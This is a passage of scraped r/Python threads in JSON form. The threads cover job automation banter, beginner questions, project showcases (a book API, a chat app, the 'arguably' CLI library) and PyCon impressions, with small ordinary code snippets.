                                    "content": "Yeah, Apple made the iPhone because the nokia and sony Ericsson phones were getting to be really good ipods and would destroy apples product line. When others are innovating you out of work, you have to get on the innovation side and kick yourself out of work. Either that or wait for obsolescence."
                                }
                            ]
                        },
                        {
                            "author": "[deleted]",
                            "score": "",
                            "content": "My supervisor is at that point right now all the time. I automated most of our job while he was out for 3 weeks. When he got back and saw me doing a lot of extra tasks for other teams, he freaked out. When I showed him how much of our job is now automated, he tried to undo everything I did. Fortunately, I showed our manager who said we had to keep those processes in place",
                            "replies": [
                                {
                                    "author": "bailey25u",
                                    "score": "56",
                                    "content": "My supervisor is at that point right now all the time. I automated most of our job while he was out for 3 weeks. When he got back and saw me doing a lot of extra tasks for other teams, he freaked out. When I showed him how much of our job is now automated, he tried to undo everything I did. Fortunately, I showed our manager who said we had to keep those processes in place"
                                },
                                {
                                    "author": "toyg",
                                    "score": "16",
                                    "content": "Well, demand for construction workers was definitely higher when they could only use shovels rather than excavators..."
                                },
                                {
                                    "author": "Gorstag",
                                    "score": "9",
                                    "content": "About a year ago I got laid off work due to myself and my colleague making our department significantly more efficient (Over many years). Around the same total revenue but about half the incoming workload. So they basically cut our staff in half at all levels and I got the axe. The departments that were an absolute clusterfuck due to mismanagement and other reasons... no cuts at all. So I do get the sentiment also, because ultimately being too efficient can end up working you out of a job."
                                }
                            ]
                        },
                        {
                            "author": "beisenhauer",
                            "score": "40",
                            "content": "Automate the boring stuff, amiright?"
                        },
                        {
                            "author": "d64",
                            "score": "42",
                            "content": "You know how consulting companies that have done some kind of a job many times before will bill a customer say 40 hours for doing it, even though it might take them only 6 hours to do, because of their expertise? Employees can and should do the same. Say this job was said to take days. Tell you will do it, then write the script or use Photoshop batches or whatever, be done in 45 minutes. Then spend the rest of the day on your own projects, then report triumphantly that you managed to pull it off in just one day. You are seen as efficient, but you are not shooting yourself in the foot by revealing the job can actually be done in no time at all.",
                            "replies": [
                                {
                                    "author": "[deleted]",
                                    "score": "22",
                                    "content": "It's not my main job - I'm a job coordinator so I handle the requests for work. I just program on the side for fun and wanted to help out. I guess I need to be careful it doesn't open a door for them to request more of this and I land myself in a hole!"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "hassium",
            "score": "292",
            "content": "They asked how. I gave them the answer You FOOL! Now our secret is out!",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "167",
                    "content": "I know right, write code, run code, go for an ice cream, watch a movie, send work 6 hours later, still a hero."
                }
            ]
        },
        {
            "author": "PawarShubham3007",
            "score": "240",
            "content": "On Linux we can do it with a single line fd --extension jpg --exec convert {} -resize 150x150 -monochrome Output/{} Dependencies : fd, imagemagick"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cz7jo9",
    "post_score": "2",
    "post_time": "Friday, May 24, 2024 at 3:00:44 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Friday Daily Thread: r/Python Meta and Free-Talk Fridays",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Ecstatic-Ice7422",
            "score": "1",
            "content": "Are many “distribution quality” apps made in python? I am currently developing a Python application for the industry I am in (performs various calculations, creates graphics for a specific utilities problem), once refined I would like to sell it. Are many such applications made in Python, and/or are there reasons why most such apps are made in a different language. I don’t want to have to recreate my project in C++."
        },
        {
            "author": "OSUBeavBane",
            "score": "1",
            "content": "I work for a large organization with several hundred teams implementing similar but not identical Pyspark solutions in Databricks. We are defining template projects (that use Poetry), common development processes and general ways of working to help teams implement their solutions as efficiently as possible. We have static analysis suites for helping code be as clean and straight forward as possible. Code deployment and static analysis is standardized at an organizational level. That being said, there are development patterns that we don't want implemented. We'd like to write custom tests that run as part of our static analysis suite to search our code for custom code patterns. Can someone recommend a tool they think would be particularly good for this purpose?"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cxmpeo",
    "post_score": "1",
    "post_time": "Wednesday, May 22, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Wednesday Daily Thread: Beginner questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Emitesoluoyedami",
            "score": "1",
            "content": "How could I learn to structure code properly? I’d like to know if there are some good practices you should follow when programing on python related to that.",
            "replies": [
                {
                    "author": "CcntMnky",
                    "score": "2",
                    "content": "This is a really great question. There is no exact answer to this, so it's something you learn over time by observation and listening to a range of opinions. Let's break this into two categories: Organizing functions and classes Look into \"composition over inheritance\". CodeAesthetic on YouTube has a great set of videos. These kinds of videos are great for exposure to different coding styles. While Python is not limited to Object Oriented Programming, I think the OOP Design Patterns are a helpful mental exercise. Some people go overboard on this, but it's good to learn about the tools. For future proofing and separation of concerns, it can be helpful to separate the business logic from your interfaces. For example, don't satisfy all of the logic inside of a web endpoint. Don't directly make database calls inside the logic. This allows you to swap out different frameworks or services without ripping up everything. It's also helpful for testing. The more I use Pydantic or data classes, the more I think that should be at the center of every project. If you can define your data well, then much of the logic becomes automatic. Organizing the code in modules and packages I'm not a fan of organizing files by type. I see this in some teams and I don't think it helps anything. I like to organize by logical areas of the design that can be tested independently. This is really helpful when working with a group, since you can accomplish things without stepping on each other or constantly waiting of everything before anything. Look at how third party packages are imported. Some have a few simple items to import. Others need you to import lots of stuff from different modules. This is indicative of how they organized the code (or at the very least a lack of an initialized package namespace). Let this influence how you want your code organized so others can import it easily."
                }
            ]
        },
        {
            "author": "MoneyClothesnHoes",
            "score": "1",
            "content": "hello, I am making a web scraper that eventually writes data to an excel sheet using pandas. For some reason whenever I set pd.ExcelWriter(mode = 'a') I get the following error, even if the file already exists: BadZipFile: File is not a zip fileBadZipFile: File is not a zip file Here is sample code that creates the error for me: import pandas as pd list = [1,2,3,4,5] df - pd.DataFrame(list) pd.ExcelWriter('test.xlsx', mode = 'a') #works with pd.ExcelWriter ('test.xlsx', mode = 'a') as writer: df.to._excel(writer, sheet_name = 'hello') #does not work If anyone could help me i would greatly appreciate it"
        },
        {
            "author": "[deleted]",
            "score": "1",
            "content": "Hello! I just wanted to ask how the boto3 python package is so popular, I know its something to do with AWS but checking pypistats (https://pypistats.org/packages/boto3 ) it has 1bn+ downloads this month? How is this possible? Is AWS this big?",
            "replies": [
                {
                    "author": "CcntMnky",
                    "score": "1",
                    "content": "boto3 (and boto2 before it) is the SDK for AWS services in Python. That's going to provide convenient interfaces to their most popular services. Yes, AWS is that big. But keep in mind, download stats are not just individuals installing locally. Any test pipeline, build system, or production deployment is likely to pull the package unless it's already cashed locally."
                }
            ]
        },
        {
            "author": "terka0302",
            "score": "1",
            "content": "Hello im currently starting to learn python and i was wondering if you know about any free resources, courses etc.. that would help me learn the basic and practice it without it being 4hours long ytb video :}",
            "replies": [
                {
                    "author": "hikingsticks",
                    "score": "2",
                    "content": "Make a free codecademy account and go through the python course there."
                }
            ]
        },
        {
            "author": "retrojoe",
            "score": "1",
            "content": "Question: How to add unique methods to specific class objects at instantiation? Best thing I've found so far is functools.partial as explained here Background explanation: I'm trying to write a sort of zork/escape room text adventure and the general architecture is a handler routine that loads a Room class object whenever the character goes thru a door. However, I want some Rooms to have unique methods related to solving puzzles and am struggling with how to best store these methods and load them into the specific instances of the Room class when that location is called up.",
            "replies": [
                {
                    "author": "CcntMnky",
                    "score": "1",
                    "content": "This works, though usually you would subclass to add your function. class TestClass(): pass def test_func(): print(\"Hello World\") var = TestClass() var.func = test_func var.func() Note: linters will complain about it because func is not defined by the class."
                }
            ]
        }
    ]
},
{
    "post_author": "the_neptunian",
    "post_id": "b3oyhl",
    "post_score": "2276",
    "post_time": "Thursday, March 21, 2019 at 1:36:18 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Made something similar to Apple's Animoji™ using Python",
    "media": [
        "https://external-preview.redd.it/5fSe_wkCxq_8UIM8iTNMWtgXT_JFX-kAmQkaFHIb42U.png?width=640&crop=smart&format=pjpg&auto=webp&s=5b51c3275e58b5fed9973fca767e6c5c3557ac05"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "the_neptunian",
            "score": "130",
            "content": "You can check out the code at https://github.com/thevarunsharma/Animoji-Animate",
            "replies": [
                {
                    "author": "Astrokiwi",
                    "score": "53",
                    "content": "Ah - so the facial recognition is all in the dlib library?",
                    "replies": [
                        {
                            "author": "the_neptunian",
                            "score": "29",
                            "content": "Yeah, it has the face detector"
                        }
                    ]
                },
                {
                    "author": "[deleted]",
                    "score": "15",
                    "content": "Have you considered to give it a license?",
                    "replies": [
                        {
                            "author": "the_neptunian",
                            "score": "12",
                            "content": "Umm...not yet, thanks for the suggestion though, will do it now"
                        },
                        {
                            "author": "TheDarkLord_22",
                            "score": "6",
                            "content": "If it's original idea, he should else he should give credits to original author."
                        }
                    ]
                },
                {
                    "author": "plottal",
                    "score": "3",
                    "content": "not that it's not excellent work, but it's a lot less code than I would've expected"
                }
            ]
        },
        {
            "author": "Naxurrus",
            "score": "35",
            "content": "Very cool! Reminds me of that DS game \"Dr. Kawashima's Brain Training\""
        },
        {
            "author": "Sjuns",
            "score": "33",
            "content": "r/mildlyterrifying"
        },
        {
            "author": "Jaik_",
            "score": "8",
            "content": "The way it jitters around gives me hand-drawn animation vibes. Really cool!"
        },
        {
            "author": "draripov",
            "score": "6",
            "content": "what is the performance of the face detector? is it made based on only your facial landmark features?"
        },
        {
            "author": "firestorm201",
            "score": "6",
            "content": "Having SNES Starfox flashbacks here"
        },
        {
            "author": "sharan_n",
            "score": "5",
            "content": "That’s really nice ! I’m definitely trying this soon."
        },
        {
            "author": "fufm",
            "score": "16",
            "content": "Inb4 you’re hired at Google"
        },
        {
            "author": "androgynyjoe",
            "score": "4",
            "content": "*yawn* I'll be interested when setting property #0 is supported. :-) I'm just kidding. Looks great!"
        },
        {
            "author": "[deleted]",
            "score": "7",
            "content": "Dope!!!"
        }
    ]
},
{
    "post_author": "ryanstephendavis",
    "post_id": "1cyceoq",
    "post_score": "167",
    "post_time": "Thursday, May 23, 2024 at 12:51:41 AM GMT+3",
    "flair_text": "Meta",
    "post_title": "Thank You PyConUS 2024 !!!",
    "media": [],
    "post_content": "First timer this year, currently at the airport leaving Pittsburgh after 6 days of PyCon...\nI've never seen such an intelligent, inclusive, humble, diverse, and inspiring group of human beings. The Python community serves as a beautiful model of what tech culture should strive towards. I could go on and on about how much fun I had, but in short, thanks to all the volunteers, staff, and FOSS developers that have cultivated such an amazing culture.",
    "comments": [
        {
            "author": "AlSweigart",
            "score": "46",
            "content": "Yay!",
            "replies": [
                {
                    "author": "ryanstephendavis",
                    "score": "14",
                    "content": "This guy has a cool lightning talk ☝️😄"
                }
            ]
        },
        {
            "author": "Yippeeedipppeee",
            "score": "14",
            "content": "I’m from pittsburgh and had no idea this was a thing 😭😭😭. Glad you enjoyed yourself!!",
            "replies": [
                {
                    "author": "ryanstephendavis",
                    "score": "9",
                    "content": "It's in Pittsburgh again next year!"
                }
            ]
        },
        {
            "author": "mercer22",
            "score": "9",
            "content": "This was my first year, too! I had a blast, and I'm definitely gonna try to go again next year. Thanks to everyone who helped organize =]"
        },
        {
            "author": "thegainsfairy",
            "score": "7",
            "content": "I really really need to remember to go to this. I've wanted to go every year for years,"
        },
        {
            "author": "Barderus1412",
            "score": "3",
            "content": "PyconUS was also my first time and it was such a blast! As I'm still a student learning Python, the event was such an eye opener to all the things that can be done using python, libraries, etc. I honestly can wait for 2025 and hopefully I can bring more folks from my CS club to attend!"
        },
        {
            "author": "Historical_Wash_1114",
            "score": "2",
            "content": "I was there. PyCon rocked!"
        },
        {
            "author": "itismillertime89",
            "score": "2",
            "content": "So sad I was forced to miss it ... Can't wait till next year though!"
        },
        {
            "author": "RaisinHonest4887",
            "score": "2",
            "content": "Are there going to be some records of the tutorials/talks somewhere?"
        }
    ]
},
{
    "post_author": "Swipecat",
    "post_id": "dbg4nm",
    "post_score": "2206",
    "post_time": "Monday, September 30, 2019 at 9:42:54 PM GMT+3",
    "flair_text": "",
    "post_title": "Rolling Shutter Effect demonstrated with Python",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "Swipecat",
            "score": "92",
            "content": "I watched the Youtube video Rolling Shutter Explained on the Cheap by Matt Parker where he shows that you don't need to visit an actual aeroplane with expensive slow-motion cameras to demonstrate the rolling shutter effect on aircraft propellors. He shows that you can do it with a model propellor connected to an electric drill — then some Python code to process the video to emulate the rolling shutter effect and to add a green line scanning down the image. Well, I thought, let's do the whole thing in Python. Here's 30 lines of Python, using the Numpy and Pillow libraries and ffmpeg to create the video: https://github.com/dafarry/rolling-shutter-effect-python/blob/master/rolling-shutter-makevideo.py Here's another version that uses Tkinter to display the video to your screen in real time rather than making a video. It needs a fast(ish) PC to display smoothly: https://github.com/dafarry/rolling-shutter-effect-python/blob/master/rolling-shutter-tkinter.py"
        },
        {
            "author": "CosmoTea",
            "score": "20",
            "content": "r/oddlysatisfying"
        },
        {
            "author": "[deleted]",
            "score": "27",
            "content": "Nice animation, explains why propellers always appear like that on video"
        },
        {
            "author": "PcGamerSam",
            "score": "7",
            "content": "That would be a cool logo for an airline."
        },
        {
            "author": "ComplexColor",
            "score": "5",
            "content": "Very nice animation and demonstration. But is this physically accurate? Light sensors are integration devices - simplified they count the number of photons over a period of time - this time is the exposure time. The demo above suggests that this integration is done line after line. Always only one line integrating for a short time. This would seem to be very inefficient, as the total exposure time would be much longer than the individual line exposure time. Would it not make more sense, that the exposure times somehow overlap? For example, if one frame exposure ends when the green line hits the sensor, but the next frames exposure starts immediately. This would totally blur the image though. So how does this actually work?"
        },
        {
            "author": "Tie_Good_Flies",
            "score": "6",
            "content": "Very cool! Can I ask why?"
        },
        {
            "author": "penguin-bonks",
            "score": "2",
            "content": "sweet man. posted on r/generative?"
        },
        {
            "author": "aitorp6",
            "score": "1",
            "content": "awesome, good work"
        }
    ]
},
{
    "post_author": "ThePawners",
    "post_id": "1d1uemr",
    "post_score": "30",
    "post_time": "Monday, May 27, 2024 at 6:39:43 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Book Management Restful-API",
    "media": [
        "https://www.instagram.com/nordszamora",
        "https://bookscollection.pythonanywhere.com/api/v1/books",
        "https://www.tiktok.com/@nordszamora",
        "https://github.com/nordszamora/Book-Management-API",
        "https://github.com/nordszamora",
        "https://www.threads.net/@nordszamora"
    ],
    "post_content": "What My Project Does:\nThis project aims to provide a simple and efficient way to manage a collection of books through various API endpoints.\nThis API allows you to:\nGet a list of all books.\nAdd a new book.\nGet a book by its isbn.\nUpdate an existing book by its isbn.\nDelete a book by its isbn.\nAPI Endpoints:\nGET /api/v1/books - Retrieve all books.\nPOST /api/v1/books - Add a new book.\nGET /api/v1/books/<ISBN> - Retrieve a book by its ISBN.\nPUT /api/v1/books/<ISBN> - Update a book by its ISBN.\nDELETE /api/v1/books/<ISBN> - Delete a book by its ISBN.\nTarget Audience:\nAnyone who is interested to integrate book management api into their applications.\nWebsite API: Book Management API\nGitHub Repo: Book-Management-API on GitHub\nFollow Me:\nIG: @nordszamora\nThreads: @nordszamora\nTiktok: @nordszamora\nGithub: @nordszamora",
    "comments": [
        {
            "author": "kerry_gold_butter",
            "score": "27",
            "content": "Congrats on the project but perhaps not the place to post it. I think someone has trolled you. Made a GET request for all books and heres a snippet of what was returned. {'author': 'Banana Man', 'genre': 'BANANAS GONE WILD PUBLISHING', 'id': 1, 'isbn': 9780061120084, 'price': -99, 'publisher': 'Banana Publishing', 'quantity': 50, 'title': 'Why are bananas yellow?', 'year': -1990} {'author': 'Banana Man', 'genre': 'BANANAS GONE WILD PUBLISHING', 'id': 2, 'isbn': 9780452284234, 'price': -99, 'publisher': 'Banana Publishing', 'quantity': 30, 'title': 'Why are bananas yellow?', 'year': -1990} I guess that's a lesson on what can happen if there is no security on your routes...",
            "replies": [
                {
                    "author": "PM_YOUR_FEET_PLEASE",
                    "score": "-5",
                    "content": "",
                    "replies": [
                        {
                            "author": "kerry_gold_butter",
                            "score": "13",
                            "content": "Yes, not doubting it is working and its a great little project for sure. Just saying someone has turned all OPs books into Why are bananas yellow by Banana Man.",
                            "replies": [
                                {
                                    "author": "PM_YOUR_FEET_PLEASE",
                                    "score": "0",
                                    "content": "They have indeed. 😂 But it proves the API works."
                                }
                            ]
                        },
                        {
                            "author": "Inkosum",
                            "score": "2",
                            "content": "Does it? Can a price and year be negative? Can a book have the same title, same author, same price, same year yet different ISBN?",
                            "replies": [
                                {
                                    "author": "PM_YOUR_FEET_PLEASE",
                                    "score": "1",
                                    "content": "Obviously it can. As that is what has happened. This APl allows you to: Get a list of all books. Add a new book. Get a book by its isbn. Update an existing book by its isbn. Delete a book by its isbn. It works."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "ikmalsaid",
            "score": "8",
            "content": "This project has gone bananas!"
        },
        {
            "author": "riklaunim",
            "score": "8",
            "content": "You are lacking schema for serialization/deserialization and validation (Marshmallow for example). List/update logic should not be next to each other - usually there is some repository level for such logic while the view is just the switch. Then the usual - testing, database migrations, authentication layer. You got a basic flask starter app that needs bit more work.",
            "replies": [
                {
                    "author": "Ran4",
                    "score": "7",
                    "content": "List/update logic should not be next to each other - usually there is some repository level for such logic while the view is just the switch. That's absolutely not needed for something like this. The repository pattern is just one pattern, it's not one that has to always be used."
                }
            ]
        },
        {
            "author": "Informal_Trash7066",
            "score": "1",
            "content": "I was workibg in something similar, great work"
        }
    ]
},
{
    "post_author": "Reasonable-Zone-7909",
    "post_id": "1cznlay",
    "post_score": "65",
    "post_time": "Friday, May 24, 2024 at 6:34:39 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made a desktop chat app :)",
    "media": [
        "https://github.com/xxzoltanxx/Balvan-Chat"
    ],
    "post_content": "What My Project Does\nHi! This is my first time doing a python project more than a few hours in size.\nI made a chat app which features E2E encryption using a passcode and has a multiclient architecture.\nAll comments are welcome!\nTarget Audience\nIt is just a toy project for my portfolio.\nComparison\nCompared to other chat clients, this one uses a passphrase to encrypt all data, with the passphrase being chosen out of the app, for instance on a dinner.\nBut I think that IRC already has this, so it doesn't differ much XD.\nGit link:\nhttps://github.com/xxzoltanxx/Balvan-Chat",
    "comments": [
        {
            "author": "AutoModerator",
            "score": "1",
            "content": ""
        },
        {
            "author": "Username_RANDINT",
            "score": "10",
            "content": "I don't think you meant to have tk in your requirements. It's this project: https://pypi.org/project/tk/",
            "replies": [
                {
                    "author": "Reasonable-Zone-7909",
                    "score": "4",
                    "content": "Thanks :)"
                }
            ]
        },
        {
            "author": "Important-Airport624",
            "score": "7",
            "content": "Do you know of any good resources to learn to build projects like this and help with overall architecture? I’m in university right now but none of my courses have covered anything like this.",
            "replies": [
                {
                    "author": "brian15co",
                    "score": "6",
                    "content": "just keep building stuff. OP's github for this project is a good resource. \"overall architecture\" will come from exposure to a bunch of these, especially valuable are the ones that don't work well with some learned indication of what was leading to it not working well"
                },
                {
                    "author": "Reasonable-Zone-7909",
                    "score": "3",
                    "content": "https://refactoring.guru/design-patterns was a starting point for me, though this app doesn't use any of them. Generally if you adhere to SOLID principles you should get a well laid out design at the end, no matter the conventional design patterns."
                }
            ]
        },
        {
            "author": "RevolutionaryRain941",
            "score": "5",
            "content": "Nice. It seems you real have a good amount of knowledge on different relationship architecture.",
            "replies": [
                {
                    "author": "Reasonable-Zone-7909",
                    "score": "7",
                    "content": "Thanks! I decided to be very organized when doing this app. I spent time just designing the relationships between different components on paper. This didn't prevent me from having issues with the design midproject though. The GUI is thus unfortunately in the main class because tkinter can only run on the main thread."
                }
            ]
        },
        {
            "author": "Paracausality",
            "score": "2",
            "content": "Nice. I was planning on making something like this for my portfolio too! But mine was going to be in terminal. No GUI. I'll save the link so that I can look at it if I ever have any questions. Thank you!",
            "replies": [
                {
                    "author": "Reasonable-Zone-7909",
                    "score": "4",
                    "content": "Welcome! I like it that it's useful to someone."
                }
            ]
        }
    ]
},
{
    "post_author": "AlSweigart",
    "post_id": "1cwqkx7",
    "post_score": "51",
    "post_time": "Tuesday, May 21, 2024 at 12:11:38 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "Dive into DevOps ebook Humble Bundle supporting the Python Software Foundation",
    "media": [
        "https://www.humblebundle.com/books/dive-into-dev-ops-no-starch-books"
    ],
    "post_content": "https://www.humblebundle.com/books/dive-into-dev-ops-no-starch-books\nBe sure to click on \"Adjust Donation\" and \"Custom Amount\" and then max out the amount going to the Python Software Foundation. (From $1.75 to $24.50!)\nFor $30 you get the following ebooks from No Starch Press:\nAutomate the Boring Stuff with Python, 2nd Edition\nDevOps for the Desperate\nHow Linux Works, 3rd Edition\nThe Book of Kubernetes\nPowerShell for Sysadmins\nPractical Vulnerability Management\nPractical SQL, 2nd Edition\nPractical Linux Forensics\nEloquent JavaScript, 3rd Edition\nCybersecurity for Small Networks\nThe Linux Command Line, 2nd Edition\nWeb Security for Developers\nMySQL Crash Course\nDesigning Secure Software\nNetwork Programming with Go\nPractice of Network Security Monitoring\nNetwork Flow Analysis\nAbsolute FreeBSD, 3rd Edition\nAbsolute OpenBSD, 2nd Edition\nLinux Firewalls\nPentesting Azure Applications\nThe Book of PF, 3rd Edition",
    "comments": [
        {
            "author": "runrudyrun",
            "score": "5",
            "content": "Oh wow this is great. How long is the sale? I'm in an IT class tomorrow and my classmates might like this.",
            "replies": [
                {
                    "author": "illqourice",
                    "score": "3",
                    "content": "Offer ends in 20 days"
                }
            ]
        },
        {
            "author": "ProcessEng",
            "score": "2",
            "content": "Started reading automate the boring stuff with Python last week, fantastic book. After several stops and starts with Python, this book and Thonny have super helpful to get a simple environment setup to learn in."
        },
        {
            "author": "crazy_bean",
            "score": "2",
            "content": "Incredible bundle, always appreciate all that you do for the community, Al!"
        },
        {
            "author": "LoganKramer",
            "score": "1",
            "content": "Names do not match ISBN and dates, they are all mixed up :(",
            "replies": [
                {
                    "author": "misaz640",
                    "score": "3",
                    "content": "He copy pasted it from my post in r/humblebundles. I fixed it in my original post: https://www.reddit.com/r/humblebundles/comments/1cwlyjb/comment/l4x8c7j/"
                }
            ]
        }
    ]
},
{
    "post_author": "[deleted]",
    "post_id": "f8bn5w",
    "post_score": "2273",
    "post_time": "Sunday, February 23, 2020 at 7:25:24 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I made a recursive maze solver in Python",
    "media": [
        "https://external-preview.redd.it/Sf26A14Sbat5bWAMsILLum4OqOM8ip8ih5-3IW9UcR8.png?width=640&crop=smart&format=pjpg&auto=webp&s=b218a933252ce2b418ecba936a207624b7229d38"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "lanemik",
            "score": "181",
            "content": "You're saying this is recursive, but I don't see the solve function being called recursively: def recursiveSolve(y, x): while [y, x] != [exitY, exitX]: pos = [y, x] wasHere.append([y, x]) solution.append([y, x]) visualiseSolver(x, y, (255, 0, 0)) if maze[y - 1][x] == \"W\" and [y - 1, x] not in wasHere: # print(\"Up\") possibleSteps = [y - 1, x] elif maze[y][x + 1] == \"W\" and [y, x + 1] not in wasHere: # print(\"Right\") possibleSteps = [y, x + 1] elif maze[y + 1][x] == \"W\" and [y + 1, x] not in wasHere: # print(\"Down\") possibleSteps = [y + 1, x] elif maze[y][x - 1] == \"W\" and [y, x - 1] not in wasHere: # print(\"Left\") possibleSteps = [y, x - 1] else: # print(\"Stuck\", pos) solution.pop() possibleSteps = [solution[-1][0], solution[-1][1]] solution.pop() visualiseSolver(x, y, (255, 255, 255)) y = possibleSteps[0] x = possibleSteps[1] solution.append([exitY, exitX]) visualiseSolver(exitX, exitY, (255, 0, 0)) print(\"Solution:\", solution) There is only one call to this function in the rest of your code. This is an iterative Depth First Search with backtracking. There is nothing recursive about it."
        },
        {
            "author": "krinistof",
            "score": "62",
            "content": "Great work! What libary did you used for display? Could you show us the source code?"
        },
        {
            "author": "[deleted]",
            "score": "30",
            "content": "Jared, The Goblin King, is displeased with this."
        },
        {
            "author": "vEnoM_420",
            "score": "25",
            "content": "Damn! How do people do such things? Always overwhelms me."
        },
        {
            "author": "thecuseisloose",
            "score": "11",
            "content": "You’d be better off using a set to track wasHere. With a list, each call to not in wasHere requires checking every element in the list. As the list grows, each check becomes longer. With a set, each check will take the same amount of time regardless of how big the set is"
        },
        {
            "author": "Tahoma-sans",
            "score": "10",
            "content": "Are you generating the maze as well?"
        },
        {
            "author": "PrashantGUPTA9",
            "score": "12",
            "content": "Hi, it is great to work can you share your GitHub of this code and also the resources that help you to get to that level of code"
        },
        {
            "author": "cheats_py",
            "score": "8",
            "content": "I think there’s potential to make it a little smarter. As humans when solving mazes we look at the grater picture and not trapping ourself into a closed loop and continue to try to solve it while obviously stuck. Add this logic and it will be a lot faster. Once it detects its closed itself inside of itself it should immediately back out and look for other options."
        },
        {
            "author": "RRButcher",
            "score": "3",
            "content": "Watching that shit erase itself is so goddamn satisfying"
        }
    ]
},
{
    "post_author": "No_One____",
    "post_id": "htkddu",
    "post_score": "2193",
    "post_time": "Saturday, July 18, 2020 at 8:25:02 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "My first major Python project! Made with 100% python using pygame. Source code and download in comments.",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "seeyainvalhalla",
            "score": "89",
            "content": "Well done"
        },
        {
            "author": "king-of-everything39",
            "score": "54",
            "content": "How long have you been leaning Python? How long did this take? Super cool btw"
        },
        {
            "author": "No_One____",
            "score": "71",
            "content": "Source code: https://github.com/000Nobody/Pygame-Platformer-Shooter download: https://000nobody.itch.io/platformer-shooter It's still a work in progress, so there might be some bugs. Feel free to report any to me if you find them. Have fun!"
        },
        {
            "author": "TheMenaceX",
            "score": "28",
            "content": "That's sick! Just out of curiosity did you follow a tutorial or something, or was this a try until you get there kinda thing?"
        },
        {
            "author": "TheWeebles",
            "score": "18",
            "content": "very cool. What did you use to design the sprites?"
        },
        {
            "author": "sifirib",
            "score": "16",
            "content": "Congrats Did you know a another language before Python? If you did, which one and what level were you in it?"
        },
        {
            "author": "Th3Legend277",
            "score": "16",
            "content": "I have worked with PyGame before and I was wondering how you got the frame rate so high?"
        },
        {
            "author": "Cheese-whiz-kalifa",
            "score": "13",
            "content": "Home boy. If you did this in four months with no prior experience, please, for me as a gamer, keep messing around with this. I can’t imagine what you could do later on with years of dedication. Also you should think about doing a YouTube tutorial for this game(please let me know if you do). I’m especially interested in learning to optimize movement speed. Ive been obsessed with learning python since I started about three months ago. Read/Worked through three books and just started learning pygame a few days ago. But this is amazingly cool. Pat yourself on the back and show this off to friends."
        },
        {
            "author": "whifling",
            "score": "8",
            "content": "That is so cool and cute. I'm well impressed. I just started learning python on my biology course and had no idea you could create something like this with it."
        }
    ]
},
{
    "post_author": "AND_MY_HAX",
    "post_id": "1cu6toc",
    "post_score": "38",
    "post_time": "Friday, May 17, 2024 at 5:37:04 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "The best Python CLI library, arguably.",
    "media": [
        "https://github.com/treykeown/arguably",
        "https://github.com/treykeown/arguably?tab=readme-ov-file#no-integration-required",
        "https://treykeown.github.io/arguably/why/"
    ],
    "post_content": "What My Project Does\nhttps://github.com/treykeown/arguably\narguably makes it super simple to define complex CLIs. It uses your function signatures and docstrings to set everything up. Here's how it works:\nAdding the @arguably.command decorator to a function makes it appear on the CLI.\nIf multiple functions are decorated, they'll all be set up as subcommands. You can even set up multiple levels of subcommands.\nThe function name, signature, and docstring are used to automatically set up the CLI\nCall arguably.run() to parse the arguments and invoke the appropriate command\nA small example:\n#!/usr/bin/env python3\nimport arguably\n\n@arguably.command\ndef some_function(required, not_required=2, *others: int, option: float = 3.14):\n    \"\"\"\n    this function is on the command line!\n\n    Args:\n        required: a required argument\n        not_required: this one isn't required, since it has a default value\n        *others: all the other positional arguments go here\n        option: [-x] keyword-only args are options, short name is in brackets\n    \"\"\"\n    print(f\"{required=}, {not_required=}, {others=}, {option=}\")\n\nif __name__ == \"__main__\":\n    arguably.run()\nbecomes\nuser@machine:~$ ./readme-1.py -h\nusage: readme-1.py [-h] [-x OPTION] required [not-required] [others ...]\n\nthis function is on the command line!\n\npositional arguments:\n  required             a required parameter (type: str)\n  not-required         this one isn't required, since it has a default (type: int, default: 2)\n  others               all the other positional arguments go here (type: int)\n\noptions:\n  -h, --help           show this help message and exit\n  -x, --option OPTION  an option, short name is in brackets (type: float, default: 3.14)\nIt can easily hand some very complex cases, like passing in QEMU-style arguments to automatically instantiated different types of classes:\nuser@machine:~$ ./readme-2.py --nic tap,model=e1000 --nic user,hostfwd=tcp::10022-:22\nnic=[TapNic(model='e1000'), UserNic(hostfwd='tcp::10022-:22')]\nYou can also auto-generate a CLI for your script through python3 -m arguably your_script.py, more on that here.\nTarget Audience\nIf you're writing a script or tool, and you need a quick and effective way to run it from the command line, arguably was made for you. It's great for things where a CLI is essential, but doesn't need tons of customization. arguably makes some opinionated decisions that keep things simple for you, but doesn't expose ways of handling things like error messages.\nI put in the work to create GitHub workflows, documentation, and proper tests for arguably. I want this to be useful for the community at large, and a tool that you can rely on. Let me know if you're having trouble with your use case!\nComparison\nThere are plenty of other tools for making CLIs out there. My goal was to build one that's unobtrusive and easy to integrate. I wrote a whole page on the project goals here: https://treykeown.github.io/arguably/why/\nA quick comparison:\nargparse - this is what arguably uses under the hood. The end user experience should be similar - arguably just aims to make it easy to set up.\nclick - a powerhouse with all the tools you'd ever want. Use this if you need extensive customization and don't mind some verbosity.\ntyper - also a great option, and some aspects are similar design-wise. It also uses functions with a decorator to set up commands, and also uses the function signature. A bit more verbose, though like click, has more customization options.\nfire - super easy to generate CLIs. arguably tries to improve on this by utilizing type hints for argument conversion, and being a little more of a middle ground between this and the more traditional ways of writing CLIs in Python.\nThis project has been a labor of love to make CLI generation as easy as it should be. Thanks for checking it out!",
    "comments": [
        {
            "author": "hotplasmatits",
            "score": "5",
